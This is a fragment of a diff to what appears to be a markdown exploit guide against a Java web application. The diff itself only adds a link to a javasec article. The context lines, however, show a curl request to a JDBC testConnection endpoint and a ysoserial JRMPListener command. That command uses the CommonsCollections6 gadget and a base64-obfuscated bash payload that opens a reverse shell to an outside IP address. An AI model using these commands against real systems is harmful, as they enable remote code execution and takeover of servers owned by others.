@@ -28,3 +28,7 @@ curl 192.168.142.1:8080/app3/testConnection/ -d 'Driver=com.tinysoft.jdbc.bridge
 ```sh
 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JAAvZGVDL3RjcC8xMjEuNDAuMjUzLjE3Ny8zODg4OCAwPiYx}|{base64,-d}|{bash,-i}"
 ```
+# Article
+
+[javasec](https://www.javasec.org/javaweb/JSON/FEATURE.html)
+
